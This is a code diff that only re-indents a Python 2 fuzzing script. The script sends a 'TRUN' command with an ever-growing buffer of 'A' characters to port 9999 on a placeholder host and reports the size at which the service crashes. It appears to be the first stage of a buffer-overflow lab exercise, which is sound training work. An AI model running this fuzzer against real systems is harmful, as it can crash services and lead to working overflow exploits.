@@ -9,14 +9,14 @@ buffer = "A" * 100
 
 while True:
         try:
-              s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-              s.connect(('x.x.x.x', 9999))
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect(('x.x.x.x', 9999))
           
-              s.send(('TRUN /.:/' + buffer))
-              s.close()
-              sleep(1)
-              buffer = buffer + "A"*100
+                s.send(('TRUN /.:/' + buffer))
+                s.close()
+                sleep(1)
+                buffer = buffer + "A"*100
               
         except:
-              print "Fuzzing crashed at %s bytes" % str(len(buffer))
-              sys.exit()
+                print "Fuzzing crashed at %s bytes" % str(len(buffer))
+                sys.exit()
